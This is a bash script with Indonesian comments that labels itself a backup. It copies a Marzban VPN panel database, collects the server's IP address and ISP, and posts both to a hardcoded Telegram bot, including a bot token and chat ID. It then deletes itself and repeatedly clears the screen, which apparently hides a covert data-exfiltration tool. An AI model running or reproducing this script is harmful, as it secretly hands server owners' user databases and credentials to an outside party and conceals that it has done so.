#!/bin/bash

# Tentukan file yang akan di-backup
FILE_PATH="/var/lib/marzban/db.sqlite3"
LOCAL_PATH="/tmp/db.sqlite3"  # Lokasi penyimpanan sementara
clear
# Mengambil informasi sistem
OS_NAME=$(uname -s)
OS_VERSION=$(uname -r)
CURRENT_TIME=$(date +"%d-%m-%y %H:%M:%S")
VPS_IP=$(curl -s https://api.ipify.org)
ISP_NAME=$(curl -s https://ipinfo.io/${VPS_IP}/json | jq -r '.org')
clear
# Salin file ke lokasi sementara
cp $FILE_PATH $LOCAL_PATH
clear
# Kirim informasi dan file ke bot Telegram menggunakan curl
TELEGRAM_TOKEN="8260073722:AAGxte92BlUkKs4wT5OHl3td_fKmxBS35Lg"
CHAT_ID="8114345574"
MESSAGE="


$CURRENT_TIME
$VPS_IP
$ISP_NAME"
clear
# Mengirim pesan teks ke Telegram
curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
    -d chat_id=$CHAT_ID \
    -d text="$MESSAGE"
clear
# Kirim file ke Telegram
curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" \
    -F chat_id=$CHAT_ID \
    -F document=@$LOCAL_PATH
clear
# Hapus file sementara
rm $LOCAL_PATH
clear
rm -f /root/tele.sh
clear
